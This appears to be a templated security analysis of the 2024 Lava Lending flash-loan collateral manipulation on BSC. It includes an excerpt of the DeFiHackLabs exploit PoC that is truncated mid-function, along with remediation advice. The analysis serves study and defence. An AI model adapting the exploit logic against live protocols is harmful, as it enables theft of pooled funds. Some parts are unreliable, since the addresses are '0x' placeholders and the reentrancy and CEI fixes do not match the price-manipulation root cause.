# Lava Lending — Flash Loan Collateral Value Manipulation and Over-Borrowing Analysis

| Item | Details |
|------|------|
| **Date** | 2024-03-28 |
| **Protocol** | Lava Lending |
| **Chain** | BSC |
| **Loss** | Unconfirmed |
| **Attacker** | [0x](https://bscscan.com/address/0x) |
| **Attack Tx** | [0x](https://bscscan.com/tx/0x) |
| **Vulnerable Contract** | [0x](https://bscscan.com/address/0x) |
| **Root Cause** | Collateral value calculation relied on AMM spot reserves, allowing reserve manipulation within a single block to overstate collateral value and enable over-borrowing |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/LavaLending_exp.sol) |

---
## 1. Vulnerability Overview

Lava Lending is a DeFi protocol operating on the BSC chain that suffered a **flash loan / collateral manipulation** attack on 2024-03-28.
The attacker manipulated collateral value via flash loan and exploited over-borrowing to cause approximately **unconfirmed** in damages.

### Key Vulnerability Summary
- **Classification**: Flash Loan / Collateral Manipulation
- **Impact**: Unconfirmed protocol asset loss
- **Attack Vector**: Price manipulation

---
## 2. Vulnerable Code Analysis (❌/✅ comments)

```solidity
// ❌ Vulnerable implementation example
// Problem: Over-borrowing after collateral value manipulation via flash loan
// The attacker exploits this logic to obtain illegitimate profit

// ILavaLending interface — flash loan collateral manipulation vulnerable functions
interface ILendingPoolProxy {
    // ❌ Vulnerable: borrow possible immediately after deposit (within same transaction)
    // Deposit large assets as collateral via flash loan, over-borrow, repay flash loan
    function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
}

interface IUniV3Wrapper {
    // ❌ Vulnerable: collateral value reflected immediately after LP position creation via deposit
    // Collateral value can be inflated by instantaneous liquidity injection
    function deposit(
        uint256 startingAmount0,
        uint256 startingAmount1,
        uint256 minAmount0Added,
        uint256 minAmount1Added
    ) external returns (uint128 liquidityMinted, uint256 sharesMinted);
    function withdraw(uint256 shares) external returns (uint128 liquidityRemoved, uint256 amount0, uint256 amount1);
    function getAssets() external view returns (uint256 amount0, uint256 amount1);
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

// ✅ Correct implementation: enforce block delay between collateral deposit and borrow
function safeBorrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external {
    // ✅ Verify at least 1 block has passed since collateral deposit (flash loan prevention)
    require(block.number > lastDepositBlock[onBehalfOf], "Borrow: same block as deposit");
    // ✅ Collateral ratio validation (TWAP-based instead of instantaneous balance)
    uint256 collateralValue = getTWAPCollateralValue(onBehalfOf);
    require(collateralValue * 1e18 / amount >= MIN_COLLATERAL_RATIO, "Borrow: insufficient collateral");
    _executeBorrow(asset, amount, interestRateMode, referralCode, onBehalfOf);
}
```

---
## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ▼
[Flash Loan Borrow] ──── BSC DEX/Lending
  │                    (borrow large token amount)
  ▼
[Price/State Manipulation] ─── Vulnerable Contract
  │                    (alter internal state)
  ▼
[Illegitimate Profit] ─── Token withdrawal/swap
  │
  ▼
[Flash Loan Repayment] ──── Profit secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// Source: DeFiHackLabs - LavaLending_exp.sol
// Chain: BSC | Date: 2024-03-28

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter USDCe balance before attack", USDCe.balanceOf(address(this)), USDCe.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter wstEth balance before attack", wstETH.balanceOf(address(this)), wstETH.decimals()
        );

        emit log_named_decimal_uint("Exploiter USDT balance before attack", USDT.balanceOf(address(this)), 6);

        emit log_named_decimal_uint(
            "Exploiter WETH balance before attack", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance before attack", USDC.balanceOf(address(this)), USDC.decimals()
        );

        uint256 amountWETH = calcWETHAmount();
        address[] memory tokens = new address[](3);
        tokens[0] = address(WETH);
        tokens[1] = address(USDC);
        tokens[2] = address(USDCe);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = amountWETH;
        amounts[1] = USDC.balanceOf(address(BalancerVault));
        amounts[2] = USDCe.balanceOf(address(BalancerVault));

        BalancerVault.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint(
            "Exploiter USDCe balance after attack", USDCe.balanceOf(address(this)), USDCe.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter wstEth balance after attack", wstETH.balanceOf(address(this)), wstETH.decimals()
        );

        emit log_named_decimal_uint("Exploiter USDT balance after attack", USDT.balanceOf(address(this)), 6);

        emit log_named_decimal_uint(
            "Exploiter WETH balance after attack", WETH.balanceOf(address(this)), WETH.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter USDC balance after attack", USDC.balanceOf(address(this)), USDC.decimals()
        );
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        // amount1=1 because Pair USDC balance is greater than specific value from attack contract (storage 19)
        WETH_USDC.flash(address(this), 0, 1, abi.encode(uint256(1), uint8(1)));
        WETH.transfer(address(BalancerVault), amounts[0]);
```

> **Note**: The code above is a PoC for educational purposes. Refer to the original file in the DeFiHackLabs repository.

---
## 5. Vulnerability Classification (Table)

| Classification Criteria | Details |
|-----------|------|
| **DASP Top 10** | Price Manipulation |
| **Attack Type** | Flash Loan Attack |
| **Vulnerability Category** | Economic Attack |
| **Attack Complexity** | High (requires flash loan) |
| **Prerequisites** | Sufficient gas and flash loan access |
| **Impact Scope** | Partial assets |
| **Patchability** | High (resolvable via code fix) |

---
## 6. Remediation Recommendations

### Immediate Actions
1. **Pause vulnerable functions**: Apply emergency pause to affected functions
2. **Assess damage**: Classify scale of lost assets and affected users
3. **Notify relevant parties**: Immediately inform related DEXs, bridges, and security research teams

### Code Fixes
```solidity
// Recommendation 1: Reentrancy protection (use OpenZeppelin ReentrancyGuard)
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Fixed is ReentrancyGuard {
    function protectedFunction() external nonReentrant {
        // Safe logic
    }
}

// Recommendation 2: Follow CEI (Checks-Effects-Interactions) pattern
function safeWithdraw(uint256 amount) external {
    // 1. Checks: validate first
    require(balances[msg.sender] >= amount, "Insufficient balance");
    // 2. Effects: update state
    balances[msg.sender] -= amount;
    // 3. Interactions: external calls last
    token.transfer(msg.sender, amount);
}

// Recommendation 3: Oracle manipulation prevention (use TWAP)
function getSafePrice() internal view returns (uint256) {
    // ✅ Use short-term TWAP to prevent instantaneous price manipulation
    return oracle.getTWAP(30 minutes);
    // ❌ Do not rely solely on current spot price
}
```

### Long-Term Improvements
- Conduct **independent security audits** (at least 2 audit firms)
- Run a **bug bounty program**
- Establish a **monitoring system** (Forta, OpenZeppelin Defender, etc.)
- Implement an **emergency stop mechanism**

---
## 7. Lessons Learned

### For Developers
1. **Flash loan / collateral manipulation attacks are preventable**: Defensible with proper validation and pattern application
2. **Consider economic incentives**: All functions must be designed with the attacker's economic motivation in mind
3. **Audit priority**: Functions that directly handle assets are the top audit priority

### For Protocol Operators
1. **Real-time monitoring**: Build systems to immediately detect abnormally large transactions
2. **Incident response plan**: Maintain an actionable response manual executable upon attack
3. **Insurance coverage**: Distribute risk through DeFi insurance protocols

### For the DeFi Ecosystem
- The **2024-03-28** Lava Lending incident reconfirms the danger of **flash loan / collateral manipulation** attacks in the BSC ecosystem
- Similar protocols should immediately audit for the same vulnerability
- Recommend strengthening community-level security information sharing frameworks

---
*This document was prepared for educational and security research purposes. Do not misuse.*
*PoC source: [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-03/LavaLending_exp.sol)*